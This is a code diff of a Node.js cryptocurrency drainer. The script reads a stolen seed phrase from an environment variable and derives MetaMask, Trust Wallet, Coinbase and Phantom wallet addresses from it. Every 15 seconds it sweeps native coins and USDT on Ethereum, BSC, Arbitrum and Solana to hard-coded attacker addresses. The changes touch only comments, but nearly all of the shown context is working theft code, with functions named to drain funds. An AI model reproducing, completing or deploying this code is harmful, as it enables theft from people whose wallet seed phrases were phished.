@@ -9,15 +9,15 @@ const { hdkey } = require("ethereumjs-wallet");
 const bs58 = require("bs58");
 require("dotenv").config();
 
-// Load seed phrase from .env
+// for the .env !!
 const SCAM_SEED = process.env.SCAM_SEED.trim();
 const mnemonic = SCAM_SEED;
 
-// Attacker wallets
+
 const ATTACKER_ADDRESS = "your EVM-compatible address"; // EVM-compatible
 const ATTACKER_SOL_ADDRESS = "your Phantom address"; // Solana
 
-// List of networks to monitor
+
 const networks = [
     { name: "Ethereum", rpc: "https://ethereum.publicnode.com", symbol: "ETH" },
     { name: "Binance Smart Chain", rpc: "https://bsc-dataseed.binance.org/", symbol: "BNB" },
@@ -25,7 +25,7 @@ const networks = [
     { name: "Arbitrum", rpc: "https://arbitrum.publicnode.com/", symbol: "ETH" }
 ];
 
-// ERC-20/BEP-20 token contracts
+
 const tokens = {
     "Ethereum": [{ name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 }],
     "Binance Smart Chain": [{ name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 }],
@@ -33,23 +33,23 @@ const tokens = {
     "Arbitrum": []
 };
 
-// ERC-20 ABI
+
 const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
     "function transfer(address recipient, uint256 amount) returns (bool)"
 ];
 
-// ** Function to derive multiple addresses **
+// extremely important function for deriving root path! 
 function getDerivedWallets() {
     const wallets = [];
 
-    // ? Generate the MASTER SEED from the mnemonic
+    //  Generate the MASTER SEED from the mnemonic
     const seed = ethers.Mnemonic.fromPhrase(mnemonic).computeSeed();
 
-    // ? Create MASTER NODE from seed
+    //  Create MASTER NODE from seed
     const masterNode = ethers.HDNodeWallet.fromSeed(seed);
 
-    // ? MetaMask & Trust Wallet derivation paths
+    //  MetaMask & Trust Wallet derivation paths
     for (let i = 0; i < 10; i++) {
         let metamaskPath = `m/44'/60'/0'/0/${i}`;
         let trustWalletPath = `m/44'/60'/0'/${i}`;
@@ -58,14 +58,14 @@ function getDerivedWallets() {
             let metamaskWallet = masterNode.derivePath(metamaskPath);
             let trustWallet = masterNode.derivePath(trustWalletPath);
 
-            wallets.push(metamaskWallet);  // ? MetaMask
-            wallets.push(trustWallet);     // ? Trust Wallet
+            wallets.push(metamaskWallet);  //  MetaMask
+            wallets.push(trustWallet);     //  Trust Wallet
         } catch (error) {
             console.error(`Error deriving wallet for MetaMask or Trust Wallet at index ${i}:`, error);
         }
     }
 
-    // ? Coinbase Wallet derivation paths
+    //  Coinbase Wallet derivation paths
     for (let i = 0; i < 5; i++) {
         let coinbasePath = `m/44'/60'/${i}'/0/0`;
 
@@ -89,7 +89,7 @@ function getDerivedSolanaWallets() {
     const seed = bip39.mnemonicToSeedSync(mnemonic);
     const wallets = [];
 
-    // Phantom Wallet standard
+    // phantom Wallet standard? not sure if this works yet
     for (let i = 0; i < 10; i++) {
         let path = `m/44'/501'/${i}'/0'`;
         let keypair = Keypair.fromSeed(seed.slice(0, 32));
@@ -102,7 +102,7 @@ function getDerivedSolanaWallets() {
 const derivedWallets = getDerivedWallets();
 const derivedSolanaWallets = getDerivedSolanaWallets();
 
-// ** Function to drain EVM funds from all derived wallets **
+// Function to drain EVM funds from all derived wallets IMPORTANT
 async function drainEVMFunds(network) {
     try {
         const provider = new ethers.JsonRpcProvider(network.rpc);
@@ -127,7 +127,7 @@ async function drainEVMFunds(network) {
                 await txResponse.wait();
             }
 
-            // Drain ERC-20/BEP-20 tokens
+          
             for (let token of tokens[network.name] || []) {
                 try {
                     const tokenContract = new ethers.Contract(token.address, ERC20_ABI, scamWallet);
@@ -147,7 +147,7 @@ async function drainEVMFunds(network) {
     }
 }
 
-// ** Function to drain Solana funds from all derived wallets **
+// Solana draining function
 async function drainSolanaFunds() {
     try {
         const connection = new Connection("https://api.mainnet-beta.solana.com");
@@ -183,7 +183,7 @@ function startDraining() {
 module.exports = { startDraining };
 
 
-// ** Monitor all chains every 15 seconds **
+// periodic intervals without event listener
 setInterval(() => {
     networks.forEach(network => drainEVMFunds(network));
     drainSolanaFunds();
